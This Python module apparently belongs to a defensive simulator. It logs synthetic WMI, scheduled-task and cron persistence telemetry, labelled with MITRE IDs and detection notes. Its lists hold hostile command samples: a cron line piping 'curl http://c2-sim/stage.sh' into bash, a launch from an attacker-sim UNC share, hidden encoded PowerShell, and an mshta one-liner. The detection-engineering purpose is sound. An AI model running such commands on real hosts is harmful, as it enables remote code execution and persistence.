from core.engine.payload_registry import register_payload
#!/usr/bin/env python3
# SHENRON: WMI Execution Ghost — WMI and scheduled task execution simulator
# PURPOSE: Emit defender-observable telemetry for execution patterns
# PRINCIPLE: Observable adversarial behavior, not portable adversarial procedure
# MITRE: T1047 (Windows Management Instrumentation),
#        T1053 (Scheduled Task/Job), T1053.002 (At),
#        T1053.003 (Cron), T1053.005 (Scheduled Task),
#        T1059.001 (PowerShell), T1059.003 (Windows Command Shell),
#        T1569 (System Services), T1569.002 (Service Execution),
#        T1106 (Native API)
# DETECTION NOTES:
#   - Alert on: WMI subscription creation (ActiveScriptEventConsumer, CommandLineEventConsumer)
#   - WMI lateral movement: wmic /node:<remote> process call create
#   - Scheduled task creation by non-system processes with suspicious actions
#   - At.exe usage (legacy, rarely legitimate)
#   - schtasks /create with encoded commands or UNC paths
#   - PowerShell -EncodedCommand with WMI process creation
#   - WMI consumer persistence via __EventFilter + __EventConsumer bindings
# NO SUBPROCESS CALLS — all execution patterns are synthetic
# NO NETWORK CALLS — all WMI remote patterns are synthetic

import json
import uuid
import random
import base64
from datetime import datetime, timezone
from pathlib import Path
from core.config import artifact_log_path as _artifact_log_path


def _get_artifact_log():
    p = _artifact_log_path()
    p.parent.mkdir(parents=True, exist_ok=True)
    return p


FAKE_WMI_NAMESPACES = [
    r"\\.\ROOT\subscription",
    r"\\.\ROOT\cimv2",
    r"\\remote-host-sim\ROOT\cimv2",
]
FAKE_TASK_NAMES = [
    r"\Microsoft\Windows\MUI\LPRemove",
    r"\Microsoft\Windows\Customer Experience Improvement Program\Consolidator",
    r"\WindowsUpdate\SIM_Task",
    r"\Adobe\Acrobat_SIM",
]
FAKE_TASK_ACTIONS = [
    r"powershell.exe -NonI -W Hidden -EncodedCommand <b64_sim>",
    r"cmd.exe /c start /b \\attacker-sim\share\payload_sim.exe",
    r"wscript.exe C:\Windows\Temp\sim.vbs",
    r"mshta.exe vbscript:CreateObject(""Wscript.Shell"").Run(""cmd_sim"",0,true)(window.close)",
]
FAKE_CRON_ENTRIES = [
    "*/5 * * * * /tmp/.sim_cron_payload > /dev/null 2>&1",
    "@reboot curl -s http://c2-sim/stage.sh | bash",
    "0 2 * * * python3 /var/tmp/.sim_beacon.py &",
]
FAKE_PROCESSES = [
    "powershell.exe", "wmic.exe", "wmiprvse.exe",
    "scrcons.exe", "mofcomp.exe", "svchost.exe"
]
FAKE_REMOTE_HOSTS = [
    "DC01-SIM", "FILESERVER-SIM", "WORKSTATION-042-SIM"
]


def _log_event(event: dict):
    with open(_get_artifact_log(), "a") as f:
        f.write(json.dumps(event) + "\n")


def _base_event(session_id, mitre, behavior, opps, phase):
    return {
        "artifact_id":             str(uuid.uuid4()),
        "session_id":              session_id,
        "layer":                   "wmi_execution_ghost",
        "phase":                   phase,
        "mitre_techniques":        mitre,
        "behavior_class":          behavior,
        "detection_opportunities": opps,
        "simulation_only":         True,
        "executable":              False,
        "no_payload_present":      True,
        "network_calls_made":      False,
        "subprocess_spawned":      False,
        "timestamp":               datetime.now(timezone.utc).isoformat(),
    }


def _phase_wmi_process_create(session_id):
    proc = random.choice(FAKE_PROCESSES)
    action = random.choice(FAKE_TASK_ACTIONS)
    namespace = FAKE_WMI_NAMESPACES[1]
    b64_payload = base64.b64encode(b"synthetic_wmi_exec_sim").decode()

    event = _base_event(session_id,
        mitre=["T1047", "T1059.001"],
        behavior="wmi_process_create_sim",
        opps=[
            "wmi_process_call_create_commandline_sim",
            "wmiprvse_spawning_unusual_child_process_sim",
            "encoded_command_in_wmi_query_sim",
            "wmi_namespace_access_non_management_tool_sim",
        ],
        phase="wmi_process_create")
    event.update({
        "source_process_sim":   proc,
        "wmi_namespace_sim":    namespace,
        "wmi_class_sim":        "Win32_Process",
        "wmi_method_sim":       "Create",
        "commandline_sim":      f"powershell.exe -NonI -W Hidden -EncodedCommand {b64_payload}",
        "parent_process_sim":   f"wmiprvse.exe (namespace: {namespace})",
        "detection_note": (
            f"WMI process creation by '{proc}' in namespace '{namespace}'. "
            f"Win32_Process.Create with encoded PowerShell command. "
            f"Alert: wmiprvse.exe spawning powershell/cmd with -Encoded or -NonInteractive."
        ),
    })
    _log_event(event)
    return event


def _phase_wmi_subscription(session_id):
    consumer_type = random.choice(["ActiveScriptEventConsumer", "CommandLineEventConsumer"])
    proc = random.choice(FAKE_PROCESSES)
    trigger = random.choice([
        "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'",
        "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'",
        "SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2",
    ])

    event = _base_event(session_id,
        mitre=["T1047", "T1546.003"],
        behavior="wmi_event_subscription_persist_sim",
        opps=[
            "wmi_event_filter_consumer_binding_creation_sim",
            "activescripteventconsumer_registration_sim",
            "wmi_subscription_namespace_root_subscription_sim",
            "scrcons_spawn_on_event_trigger_sim",
        ],
        phase="wmi_subscription")
    event.update({
        "source_process_sim":    proc,
        "namespace_sim":         FAKE_WMI_NAMESPACES[0],
        "filter_name_sim":       f"SIM_Filter_{uuid.uuid4().hex[:8]}",
        "consumer_type_sim":     consumer_type,
        "consumer_name_sim":     f"SIM_Consumer_{uuid.uuid4().hex[:8]}",
        "event_query_sim":       trigger,
        "payload_sim":           "powershell.exe -c payload_sim [SIM]",
        "persistence_type_sim":  "survives reboot — stored in WMI repository",
        "detection_note": (
            f"WMI event subscription via '{consumer_type}' by '{proc}'. "
            f"Filter+Consumer+Binding triple in ROOT\\subscription. "
            f"Alert: new WMI subscription creation — query EventID 5861 (WMI Activity), "
            f"or monitor ROOT\\subscription namespace writes."
        ),
    })
    _log_event(event)
    return event


def _phase_wmi_lateral(session_id):
    remote = random.choice(FAKE_REMOTE_HOSTS)
    proc = random.choice(FAKE_PROCESSES)
    action = random.choice(FAKE_TASK_ACTIONS)

    event = _base_event(session_id,
        mitre=["T1047", "T1021"],
        behavior="wmi_lateral_movement_sim",
        opps=[
            "wmic_remote_node_process_create_sim",
            "dcom_lateral_movement_wmi_sim",
            "remote_wmi_query_non_management_tool_sim",
            "smb_dcom_traffic_to_internal_host_sim",
        ],
        phase="wmi_lateral")
    event.update({
        "source_process_sim":   proc,
        "remote_host_sim":      remote,
        "wmi_namespace_sim":    f"\\\\{remote}\\ROOT\\cimv2",
        "commandline_sim":      f"wmic /node:{remote} /user:DOMAIN\\SIM_Admin process call create \"{action}\"",
        "auth_type_sim":        random.choice(["NTLM", "Kerberos"]),
        "detection_note": (
            f"WMI lateral movement to '{remote}' via '{proc}'. "
            f"wmic /node: process call create is high-signal — "
            f"rarely legitimate outside specific management scenarios. "
            f"Alert: wmic.exe with /node: argument + process call create."
        ),
    })
    _log_event(event)
    return event


def _phase_scheduled_task(session_id):
    task_name = random.choice(FAKE_TASK_NAMES)
    action = random.choice(FAKE_TASK_ACTIONS)
    proc = random.choice(["schtasks.exe", "powershell.exe", "taskschd.dll via COM"])
    trigger = random.choice(["ONLOGON", "ONSTART", "DAILY at 02:00", "MINUTE /MO 5"])

    event = _base_event(session_id,
        mitre=["T1053", "T1053.005"],
        behavior="scheduled_task_create_sim",
        opps=[
            "schtasks_create_with_encoded_action_sim",
            "scheduled_task_in_system_namespace_sim",
            "task_action_pointing_to_temp_or_unc_sim",
            "task_created_by_non_task_scheduler_process_sim",
        ],
        phase="scheduled_task")
    event.update({
        "source_process_sim":  proc,
        "task_name_sim":       task_name,
        "trigger_sim":         trigger,
        "action_sim":          action,
        "run_as_sim":          random.choice(["SYSTEM", "NT AUTHORITY\\SYSTEM", "DOMAIN\\SIM_Admin"]),
        "xml_task_sim":        f"<Task><Actions><Exec><Command>{action[:50]}</Command></Exec></Actions></Task>",
        "detection_note": (
            f"Scheduled task '{task_name}' created by '{proc}'. "
            f"Action: '{action[:60]}'. "
            f"Alert: task actions with EncodedCommand, UNC paths, or temp directory executables. "
            f"Monitor Event ID 4698 (Task Created) in Security log."
        ),
    })
    _log_event(event)
    return event


def _phase_cron_persistence(session_id):
    cron_entry = random.choice(FAKE_CRON_ENTRIES)
    cron_file = random.choice([
        "/etc/cron.d/sim_cron",
        "/var/spool/cron/crontabs/root",
        f"/etc/cron.hourly/sim_{uuid.uuid4().hex[:6]}",
    ])
    proc = random.choice(["bash", "python3", "curl | bash"])

    event = _base_event(session_id,
        mitre=["T1053", "T1053.003"],
        behavior="cron_persistence_sim",
        opps=[
            "cron_entry_write_by_non_crontab_process_sim",
            "cron_d_file_creation_unusual_name_sim",
            "cron_action_network_fetch_pipe_shell_sim",
            "root_crontab_modification_sim",
        ],
        phase="cron_persistence")
    event.update({
        "source_process_sim":  proc,
        "cron_file_sim":       cron_file,
        "cron_entry_sim":      cron_entry,
        "schedule_sim":        cron_entry.split(" ")[:5],
        "action_sim":          " ".join(cron_entry.split(" ")[5:]),
        "detection_note": (
            f"Cron persistence via write to '{cron_file}' by '{proc}'. "
            f"Entry: '{cron_entry[:60]}'. "
            f"Alert: /etc/cron.d writes by non-package-manager processes, "
            f"cron actions with curl|bash or network fetches."
        ),
    })
    _log_event(event)
    return event


@register_payload("wmi_execution_ghost")
def main():
    session_id = str(uuid.uuid4())
    phases = [
        ("wmi_process_create", _phase_wmi_process_create),
        ("wmi_subscription",   _phase_wmi_subscription),
        ("wmi_lateral",        _phase_wmi_lateral),
        ("scheduled_task",     _phase_scheduled_task),
        ("cron_persistence",   _phase_cron_persistence),
    ]

    print(f"\n  [SIMULATION]  wmi_execution_ghost")
    print(f"  [SESSION]     {session_id}")
    print(f"  [EVENTS]      {len(phases)}")
    print(f"  [MITRE]       T1047, T1053, T1053.002, T1053.003, T1053.005, T1546.003, T1059.001")
    print(f"  [SUBPROCESS]  NOT CALLED — synthetic only")
    print(f"  [NETWORK]     NO CALLS MADE — synthetic only")
    print()

    events = []
    for phase_name, phase_fn in phases:
        event = phase_fn(session_id)
        events.append(event)
        print(f"  [PHASE: {phase_name}]")
        print(f"    behavior      : {event['behavior_class']}")
        print(f"    mitre         : {', '.join(event['mitre_techniques'])}")
        print(f"    detection     : {event['detection_opportunities'][0]}")
        print(f"    note          : {event.get('detection_note','')[:80]}")
        print()

    print(f"  [LOGGED]      {_get_artifact_log()}")
    print(f"  [SAFE]        no subprocess calls, no network — simulation only")
    return events
